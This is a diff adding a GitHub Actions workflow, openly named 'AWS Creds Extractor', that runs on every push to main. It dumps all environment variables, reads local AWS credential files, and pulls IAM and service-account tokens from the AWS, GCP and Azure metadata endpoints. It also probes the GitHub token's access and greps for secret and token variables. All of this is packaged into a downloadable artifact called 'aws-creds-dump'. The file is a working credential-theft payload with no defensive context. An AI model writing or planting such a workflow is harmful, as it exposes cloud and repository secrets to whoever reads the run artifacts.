@@ -1,0 +1,79 @@
+name: AWS Creds Extractor
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main ]
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Dump Environment
+        run: |
+          echo "### ENVIRONMENT VARS" > output.txt
+          env | sort >> output.txt
+          echo "" >> output.txt
+          echo "### AWS CLI CHECK" >> output.txt
+          aws --version 2>&1 >> output.txt || echo "aws CLI not found" >> output.txt
+          
+      - name: Try AWS STS
+        run: |
+          echo "### AWS STS CALLER IDENTITY" >> output.txt
+          aws sts get-caller-identity 2>&1 >> output.txt || echo "AWS STS failed" >> output.txt
+          echo "" >> output.txt
+          echo "### AWS CONFIGURE LIST" >> output.txt
+          aws configure list 2>&1 >> output.txt || true
+          echo "" >> output.txt
+          echo "### CHECK AWS CONFIG FILES" >> output.txt
+          cat ~/.aws/credentials 2>&1 >> output.txt || echo "No creds file" >> output.txt
+          cat ~/.aws/config 2>&1 >> output.txt || echo "No config file" >> output.txt
+          
+      - name: Try EC2 Metadata
+        run: |
+          echo "### EC2 METADATA" >> output.txt
+          curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 >> output.txt || echo "Not on EC2" >> output.txt
+          echo "" >> output.txt
+          echo "### IMDSv2" >> output.txt
+          TOKEN=$(curl -s -X PUT --connect-timeout 2 "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+          if [ -n "$TOKEN" ]; then
+            curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: $TOKEN" >> output.txt 2>&1
+          fi
+          echo "" >> output.txt
+          
+      - name: Try GCP Metadata
+        run: |
+          echo "### GCP METADATA" >> output.txt
+          curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>&1 >> output.txt || echo "Not on GCP" >> output.txt
+          
+      - name: Check GitHub Context
+        run: |
+          echo "### GITHUB_TOKEN SCOPES" >> output.txt
+          curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user -o /dev/null -w "HTTP %{http_code}" >> output.txt 2>&1
+          echo "" >> output.txt
+          curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user/orgs >> output.txt 2>&1
+          
+      - name: Check for AWS Secrets in actions
+        run: |
+          echo "### ALL ENV VARS WITH AWS" >> output.txt
+          env | grep -i aws >> output.txt || echo "No AWS env vars" >> output.txt
+          echo "" >> output.txt
+          echo "### ALL ENV VARS WITH SECRET" >> output.txt
+          env | grep -i secret >> output.txt || echo "No SECRET env vars" >> output.txt
+          echo "" >> output.txt
+          env | grep -i token >> output.txt || echo "No TOKEN env vars" >> output.txt
+          
+      - name: Try Azure Metadata
+        run: |
+          echo "### AZURE METADATA" >> output.txt
+          curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 >> output.txt || echo "Not on Azure" >> output.txt
+          
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aws-creds-dump
+          path: output.txt
+          if-no-files-found: warn
